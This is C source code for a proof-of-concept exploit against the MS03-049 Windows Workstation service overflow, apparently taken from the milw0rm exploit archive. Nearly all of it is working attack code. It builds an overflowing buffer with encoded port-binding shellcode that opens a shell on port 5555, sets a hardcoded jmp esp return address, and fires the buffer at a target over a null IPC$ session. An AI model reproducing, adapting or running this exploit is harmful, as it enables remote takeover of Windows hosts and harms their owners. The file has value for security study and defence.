/*
        Proof of concept for MS03-049.
        This code was tested on a Win2K SP4 with FAT32 file system, and is supposed
        to work *only* with that (it will probably crash the the other 2Ks, no clue
        about XPs).

        To be compiled with lcc-win32 (*hint* link mpr.lib) ... I will not improve
        this public version, do not bother to ask.
        
        Credits go to eEye
        See original bulletin for more information, it is very well documented.
*/

#include <stdio.h>
#include <win.h>
#include <string.h>

typedef int (*MYPROC)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);

#define SIZE 2048

// PEX generated port binding shellcode (5555)
unsigned char shellcode[] =
"\x66\x81\xec\x04\x07" // sub sp, 704h
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31"
"\xc9\x81\xe9\xa6\xff\xff\xff\x81\x36\x76\xac\x7c\x25\x81\xee\xfc"
"\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff\x9e\x94\x7c\x25"
"\x76\xef\x31\x61\x76\x4b\x05\xe3\x0f\x49\x35\xa3\x3f\x08\xd1\x0b"
"\x9f\x08\x66\x55\xb1\x75\x75\xd0\xdb\x67\x91\xd9\x4d\x22\x32\x2b"
"\x9a\xd2\xa4\xc7\x05\x01\xa5\x20\xb8\xde\x82\x96\x60\xfb\x2f\x17"
"\x29\x9f\x4e\x0b\x32\xe0\x30\x25\x77\xf7\x28\xac\x93\x25\x21\x25"
"\x1c\x9c\x25\x41\xfd\xad\xf7\x65\x7a\x27\x0c\x39\xdb\x27\x24\x2d"
"\x9d\xa0\xf1\x72\x5a\xfd\x2e\xda\xa6\x25\xbf\x7c\x9d\xbc\x16\x2d"
"\x28\xad\x92\x4f\x7c\xf5\xf7\x58\x76\x2c\x85\x23\x02\x48\x2d\x76"
"\x89\x98\xf3\xcd\xe6\xac\x7c\x25\x2f\x25\x78\xab\x94\x47\x4d\xda"
"\x10\x2d\x90\xb5\x77\xf8\x14\x24\x77\xac\x7c\xda\x23\x8c\x2b\x72"
"\x21\xfb\x3b\x72\x31\xfb\x83\x70\x6a\x25\xbf\x14\x89\xfb\x2b\x4d"
"\x74\xac\x69\x96\xff\x4a\x16\x35\x20\xff\x83\x70\x6e\xfb\x2f\xda"
"\x23\xb8\x2b\x73\x25\x53\x29\x35\xff\x6e\x1a\xa4\x9a\xf8\x7c\xa8"
"\x4a\x88\x4d\xe5\x1c\xb9\x25\xd6\xdd\x25\xab\xe3\x32\x88\x6c\x61"
"\x88\xe8\x58\x18\xff\xd0\x58\x6d\xff\xd0\x58\x69\xff\xd0\x58\x75"
"\xfb\xe8\x58\x35\x22\xfc\x2d\x74\x27\xed\x2d\x6c\x27\xfd\x83\x50"
"\x76\xfd\x83\x70\x46\x25\x9d\x4d\x89\x53\x83\xda\x89\x9d\x83\x70"
"\x5a\xfb\x83\x70\x7a\x53\x29\x0d\x25\xf9\x2a\x72\xfd\xc0\x58\x3d"
"\xfd\xe9\x40\xae\x22\xa9\x04\x24\x9c\x27\x36\x3d\xfd\xf6\x5c\x24"
"\x9d\x4f\x4e\x6c\xfd\x98\xf7\x24\x98\x9d\x83\xd9\x47\x6c\xd0\x1d"
"\x96\xd8\x7b\xe4\xb9\xa1\x7d\xe2\x9d\x5e\x47\x59\x52\xb8\x09\xc4"
"\xfd\xf6\x58\x24\x9d\xca\xf7\x29\x3d\x27\x26\x39\x77\x47\xf7\x21"
"\xfd\xad\x94\xce\x74\x9d\xbc\xac\x9c\xf3\x22\x78\x2d\x6e\x74\x25";

unsigned char jmp[] =
"\xe9\x6f\xfd\xff\xff"; // jmp -290h to land in the payload

int main(void)
{
        int ret;
        HINSTANCE hInstance;
        MYPROC procAddress;
        char szBuffer[SIZE];
        NETRESOURCE netResource;

        netResource.lpLocalName = NULL;
        netResource.lpProvider = NULL;
        netResource.dwType = RESOURCETYPE_ANY;
        netResource.lpRemoteName = "\\\\192.168.175.3\\ipc$";

        ret = WNetAddConnection2(&netResource, "", "", 0); // attempt a null session
        if (ret != 0)
        {
                fprintf(stderr, "[-] WNetAddConnection2 failed\n");
                return 1;
        }

        hInstance = LoadLibrary("netapi32");
        if (hInstance == NULL)
        {
                fprintf(stderr, "[-] LoadLibrary failed\n");
                return 1;
        }

        procAddress = (MYPROC)GetProcAddress(hInstance, "NetValidateName"); // up to you tocheck NetAddAlternateComputerName
        if (procAddress == NULL)
        {
                fprintf(stderr, "[-] GetProcAddress failed\n");
                return 1;
        }

        memset(szBuffer, 0x90, sizeof(szBuffer));
        memcpy(&szBuffer[1400], shellcode, sizeof(shellcode) - 1);
        // ebp @ &szBuffer[2013]
        *(unsigned int *)(&szBuffer[2017]) = 0x74fdee63; // eip (jmp esp @ msafd.dll, useopcode search engine for more, but
                      // be aware that a call esp willchange the offset in the stack)
        memcpy(&szBuffer[2021 + 12], jmp, sizeof(jmp)); // includes terminal NULL char
        ret = (procAddress)(L"\\\\192.168.175.3", szBuffer, NULL, NULL, 0);

        WNetCancelConnection2("\\\\192.168.175.3\\ipc$", 0, TRUE);
        FreeLibrary(hInstance);

        return 0;
}

// milw0rm.com [2003-11-12]
